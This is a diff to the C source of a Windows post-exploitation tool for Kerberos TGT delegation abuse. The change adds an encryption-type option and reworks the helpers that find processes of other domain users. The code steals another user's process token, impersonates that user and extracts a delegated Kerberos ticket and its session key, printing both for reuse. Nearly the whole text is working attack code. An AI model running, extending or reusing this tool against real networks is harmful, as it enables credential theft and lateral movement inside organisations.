@@ -54,53 +54,59 @@ HANDLE GetCurrentToken() {
 }
 
 BOOL GetTokenUserW(_In_ HANDLE hToken, _Out_ LPWSTR* szUsername) {
-    BOOL                        bResult = FALSE;
-    PTOKEN_USER                 pTokenUser = NULL;
-    DWORD                       dwLength = 0;
-    LPWSTR                      lpName = NULL, lpDomain = NULL;
-    DWORD                       cchName = 0, cchDomain = 0;
-    SID_NAME_USE                sidUse;
+    PTOKEN_USER pTokenUser = NULL;
+    DWORD dwLength = 0;
+    LPWSTR lpName = NULL, lpDomain = NULL;
+    DWORD cchName = 0, cchDomain = 0;
+    SID_NAME_USE sidUse;
+    BOOL bResult = FALSE;
 
     if (!hToken || !szUsername) return FALSE;
     *szUsername = NULL;
 
-    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
-    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;
+    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength)) {
+        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;
+    }
 
     pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
-    if (pTokenUser == NULL) return FALSE;
+    if (!pTokenUser) return FALSE;
 
-    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) goto _END_OF_FUNC;
+    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength))
+        goto cleanup;
 
-    LookupAccountSidW(NULL, pTokenUser->User.Sid, NULL, &cchName, NULL, &cchDomain, &sidUse);
-    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto _END_OF_FUNC;
+    if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, NULL, &cchName, NULL, &cchDomain, &sidUse)) {
+        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto cleanup;
+    }
 
     lpName = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchName * sizeof(WCHAR));
     lpDomain = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchDomain * sizeof(WCHAR));
-    if (lpName == NULL || lpDomain == NULL) goto _END_OF_FUNC;
+    if (!lpName || !lpDomain) goto cleanup;
 
-    if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, lpName, &cchName, lpDomain, &cchDomain, &sidUse)) goto _END_OF_FUNC;
+    if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, lpName, &cchName, lpDomain, &cchDomain, &sidUse))
+        goto cleanup;
 
     DWORD totalSize = cchDomain + 1 + cchName + 1;
     *szUsername = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalSize * sizeof(WCHAR));
-    if (*szUsername == NULL) goto _END_OF_FUNC;
+    if (!*szUsername) goto cleanup;
 
     swprintf_s(*szUsername, totalSize, L"%s\\%s", lpDomain, lpName);
     bResult = TRUE;
 
-_END_OF_FUNC:
+cleanup:
     if (pTokenUser) HeapFree(GetProcessHeap(), 0, pTokenUser);
     if (lpName) HeapFree(GetProcessHeap(), 0, lpName);
     if (lpDomain) HeapFree(GetProcessHeap(), 0, lpDomain);
+
     if (!bResult && szUsername && *szUsername) {
         HeapFree(GetProcessHeap(), 0, *szUsername);
         *szUsername = NULL;
     }
+
     return bResult;
 }
 
 
-int forgeTGT(wchar_t* spn)
+int forgeTGT(wchar_t* spn, int encType)
 {
     int resultStatus = 1;
     CredHandle hCredential;
@@ -160,67 +166,60 @@ int forgeTGT(wchar_t* spn)
                             retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
                             RtlMoveMemory(retrieveRequest->TargetName.Buffer, spn, retrieveRequest->TargetName.MaximumLength);
 
-                            int encryptionTypes[] = { 18, 17, 23 }; // AES256, AES128, RC4
-                            const char* encryptionNames[] = { "AES256", "AES128", "RC4" };
-                            BOOL success = FALSE;
+                            const char* encryptionName;
+                            if (encType == 17) encryptionName = "AES128";
+                            else if (encType == 23) encryptionName = "RC4";
+                            else encryptionName = "AES256";
+
+                            retrieveRequest->EncryptionType = encType;
                             PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;
+                            NTSTATUS packageStatus = 0;
+                            ULONG returnLength = 0;
 
-                            for (int i = 0; i < 3; ++i) {
-                                retrieveRequest->EncryptionType = encryptionTypes[i];
-                                if (retrieveResponse) LsaFreeReturnBuffer(retrieveResponse);
-                                retrieveResponse = NULL;
-                                NTSTATUS packageStatus = 0;
-                                ULONG returnLength = 0;
+                            NTSTATUS callauthPkg = LsaCallAuthenticationPackage(lsaHandle, authpackageId, (PVOID)retrieveRequest, bufferLength, (PVOID*)&retrieveResponse, &returnLength, &packageStatus);
 
-                                NTSTATUS callauthPkg = LsaCallAuthenticationPackage(lsaHandle, authpackageId, (PVOID)retrieveRequest, bufferLength, (PVOID*)&retrieveResponse, &returnLength, &packageStatus);
+                            if (callauthPkg == statusSuccess && packageStatus == statusSuccess) {
+                                wprintf(L"[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!\n");
+                                fflush(stdout);
 
-                                if (callauthPkg == statusSuccess && packageStatus == statusSuccess) {
-                                    wprintf(L"[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!\n");
-                                    fflush(stdout);
+                                PVOID sessionkeynob64 = malloc(retrieveResponse->Ticket.SessionKey.Length);
+                                if (sessionkeynob64) {
+                                    RtlMoveMemory(sessionkeynob64, retrieveResponse->Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);
+                                    DWORD sessionKeyB64Size = 0;
+                                    CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &sessionKeyB64Size);
+                                    LPSTR sessionKey = (LPSTR)malloc(sessionKeyB64Size);
+                                    if (sessionKey && CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, sessionKey, &sessionKeyB64Size)) {
 
-                                    PVOID sessionkeynob64 = malloc(retrieveResponse->Ticket.SessionKey.Length);
-                                    if (sessionkeynob64) {
-                                        RtlMoveMemory(sessionkeynob64, retrieveResponse->Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);
-                                        DWORD sessionKeyB64Size = 0;
-                                        CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &sessionKeyB64Size);
-                                        LPSTR sessionKey = (LPSTR)malloc(sessionKeyB64Size);
-                                        if (sessionKey && CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, sessionKey, &sessionKeyB64Size)) {
+                                        printf("\n[+] AP-REQ output:\n");
+                                        fflush(stdout);
 
-                                            printf("\n[+] AP-REQ output:\n");
+                                        const size_t chunkSize = 64;
+                                        const char* currentPos = base64String;
+                                        size_t totalLen = strlen(base64String);
+                                        while (currentPos < base64String + totalLen) {
+                                            size_t remaining = totalLen - (currentPos - base64String);
+                                            size_t lenToPrint = (remaining < chunkSize) ? remaining : chunkSize;
+                                            fwrite(currentPos, sizeof(char), lenToPrint, stdout);
                                             fflush(stdout);
-
-                                            const size_t chunkSize = 64;
-                                            const char* currentPos = base64String;
-                                            size_t totalLen = strlen(base64String);
-                                            while (currentPos < base64String + totalLen) {
-                                                size_t remaining = totalLen - (currentPos - base64String);
-                                                size_t lenToPrint = (remaining < chunkSize) ? remaining : chunkSize;
-                                                fwrite(currentPos, sizeof(char), lenToPrint, stdout);
-                                                fflush(stdout);
-                                                currentPos += lenToPrint;
-                                            }
-
-                                            printf("\n\n[+] Kerberos session key: \n%s\n\n[+] Encryption:\n%s\n", sessionKey, encryptionNames[i]);
-                                            fflush(stdout);
-
-                                            success = TRUE;
-                                            free(sessionKey);
+                                            currentPos += lenToPrint;
                                         }
-                                        free(sessionkeynob64);
+
+                                        printf("\n\n[+] Kerberos session key: \n%s\n\n[+] Encryption:\n%s\n", sessionKey, encryptionName);
+                                        fflush(stdout);
+
+                                        resultStatus = 0;
+                                        free(sessionKey);
                                     }
-                                    break;
+                                    free(sessionkeynob64);
                                 }
                             }
-                            if (retrieveResponse) LsaFreeReturnBuffer(retrieveResponse);
-                            LocalFree(retrieveRequest);
-
-                            if (success) {
-                                resultStatus = 0;
-                            }
                             else {
-                                wprintf(L"\nError! Failed to retrieve Kerberos session key.\n");
+                                wprintf(L"\nError! Failed to retrieve Kerberos session key with encryption type %S.\n", encryptionName);
                                 fflush(stdout);
                             }
+
+                            if (retrieveResponse) LsaFreeReturnBuffer(retrieveResponse);
+                            LocalFree(retrieveRequest);
                         }
                     }
                     LsaDeregisterLogonProcess(lsaHandle);
@@ -263,7 +262,7 @@ BOOL ListProcesses() {
         return FALSE;
     }
 
-    //wprintf(L"[*] Machine is joined to domain: %s\n", szDomainName);
+    wprintf(L"[*] Machine is joined to domain: %s\n", szDomainName);
 
     hCurrentToken = GetCurrentToken();
     if (!hCurrentToken || !GetTokenUserW(hCurrentToken, &szCurrentUser)) {
@@ -304,10 +303,23 @@ BOOL ListProcesses() {
                     if (_wcsicmp(szCurrentUser, szProcessUser) != 0) {
                         wchar_t* separator = wcschr(szProcessUser, L'\\');
                         if (separator) {
-                            size_t domainPartLength = separator - szProcessUser;
-                            if (_wcsnicmp(szProcessUser, szDomainName, domainPartLength) == 0 && wcslen(szDomainName) == domainPartLength) {
-                                wprintf(L"%-6lu | %-40s | %s\n", pe32.th32ProcessID, szProcessUser, pe32.szExeFile);
-                                fflush(stdout);
+                            LPWSTR domainPart = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (separator - szProcessUser + 1) * sizeof(WCHAR));
+                            if (domainPart) {
+                                wcsncpy_s(domainPart, separator - szProcessUser + 1, szProcessUser, separator - szProcessUser);
+
+                                BOOL isLocalAccount = (_wcsicmp(domainPart, L"NT AUTHORITY") == 0 ||
+                                    _wcsicmp(domainPart, L"BUILTIN") == 0 ||
+                                    _wcsicmp(domainPart, L"NT SERVICE") == 0 ||
+                                    _wcsicmp(domainPart, L"WINDOW MANAGER") == 0 ||
+                                    _wcsicmp(domainPart, L"FONT DRIVER HOST") == 0 ||
+                                    wcschr(domainPart, L'$') != NULL);
+
+                                if (!isLocalAccount) {
+                                    wprintf(L"%-6lu | %-40s | %s\n", pe32.th32ProcessID, szProcessUser, pe32.szExeFile);
+                                    fflush(stdout);
+                                }
+
+                                HeapFree(GetProcessHeap(), 0, domainPart);
                             }
                         }
                     }
@@ -326,7 +338,7 @@ BOOL ListProcesses() {
 }
 
 
-void StealAndDelegate(ULONG pid, wchar_t* domainnameArg, wchar_t* spnArg) {
+void StealAndDelegate(ULONG pid, wchar_t* domainnameArg, wchar_t* spnArg, int encType) {
     HANDLE hToken = NULL;
     HANDLE hCurrentToken = GetCurrentToken();
     if (hCurrentToken) {
@@ -367,7 +379,7 @@ void StealAndDelegate(ULONG pid, wchar_t* domainnameArg, wchar_t* spnArg) {
     wprintf(L"[+] Target Domain (for reference): %s\n", domainnameArg); fflush(stdout);
     wprintf(L"[+] Target SPN: %s\n", spnArg); fflush(stdout);
 
-    if (forgeTGT(spnArg) == 0) {
+    if (forgeTGT(spnArg, encType) == 0) {
         wprintf(L"\n[+] tgtdelegation succeeded under impersonated context!\n"); fflush(stdout);
     }
     else {
@@ -395,9 +407,11 @@ void PrintUsage(const wchar_t* progName) {
     wprintf(L"\nTool to perform TGT delegation abuse, with token stealing capabilities.\n\n");
     wprintf(L"Usage: %s <option> [arguments]\n\n", progName);
     wprintf(L"Options:\n");
-    wprintf(L"  /list\t\t\t\tLists processes from other domain users.\n");
-    wprintf(L"  /steal <PID> <domain> <spn>\tSteals token, impersonates, and runs tgtdelegation.\n\n");
+    wprintf(L"  /list\t\t\t\t\tLists processes from other domain users.\n");
+    wprintf(L"  /steal <PID> <domain> <spn> [/enctype:TYPE]\tSteals token, impersonates, and runs tgtdelegation.\n\n");
+    wprintf(L"  Encryption types (optional): aes256 (default), aes128, rc4\n\n");
     wprintf(L"  Example: %s /steal 6969 corp.local CIFS/dc01.corp.local\n", progName);
+    wprintf(L"  Example: %s /steal 6969 corp.local CIFS/dc01.corp.local /enctype:aes256\n", progName);
     fflush(stdout);
 }
 
@@ -425,7 +439,24 @@ int wmain(int argc, wchar_t* argv[]) {
             wprintf(L"[!] Error: Invalid PID.\n\n"); fflush(stdout);
             return 1;
         }
-        StealAndDelegate(pid, argv[3], argv[4]);
+
+        int encType = 18;
+
+        if (argc >= 6 && _wcsnicmp(argv[5], L"/enctype:", 9) == 0) {
+            wchar_t* encTypeStr = argv[5] + 9;
+            if (_wcsicmp(encTypeStr, L"aes128") == 0) {
+                encType = 17;
+            }
+            else if (_wcsicmp(encTypeStr, L"rc4") == 0) {
+                encType = 23;
+            }
+            else if (_wcsicmp(encTypeStr, L"aes256") != 0) {
+                wprintf(L"[!] Error: Invalid encryption type. Valid options: aes256, aes128, rc4\n\n"); fflush(stdout);
+                return 1;
+            }
+        }
+
+        StealAndDelegate(pid, argv[3], argv[4], encType);
     }
     else {
         wprintf(L"[!] Error: Unknown option \"%s\".\n\n", argv[1]); fflush(stdout);
